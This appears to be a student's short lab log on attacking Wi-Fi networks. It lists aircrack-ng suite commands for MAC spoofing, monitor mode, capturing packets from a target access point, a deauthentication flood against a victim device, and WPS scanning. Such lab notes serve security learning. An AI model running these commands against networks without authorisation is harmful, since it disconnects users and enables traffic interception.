# Network Hacking

## Objective
To learn how malicious hackers hack a wired or wireless network and steal information for educational purpose.

## Tool Used
- Nmap/Zenmap
- Aircrack-NG
- Crunch
- Bettercap
- Wireshark

## Steps Performed
### Pre-connection Attacks
1. Bring down my machine interface to change the MAC address

-ifconfig wlan0 down,
- ifconfig wlan0 hw ether *new mac address*
- ifconfig wlan0 up ✅

2.Set my adapter to monitor mode

- iwconfig
- ifconfig wlan0 down
- aimon-ng check kill
- iwconfig wlan0 mode monitor
- ifconfig wlan0 up  ✅

3. Run airodump-ng to sniff and capture packets sent to and from the target access point
   
- iwconfig
- airodump-ng *int name*
- airodump-ng --band a wlan0
- airodump-ng --bssid *value* --channel *value* --write *output file* wlan0  ✅

4. Disconnect a device from the target network

- aireplay-ng --deauth 1000000 -a *access point mac* -c *victim Mac* wlan0  ❌

## Gaining Access
5. View all networks with WPS enabled:
- wash --interface wlan0 ✅




## What I Learned
- How to identify active services
- Importance of open ports in security

## Next Steps
- Learn service version detection
- Understand firewall evasion techniques
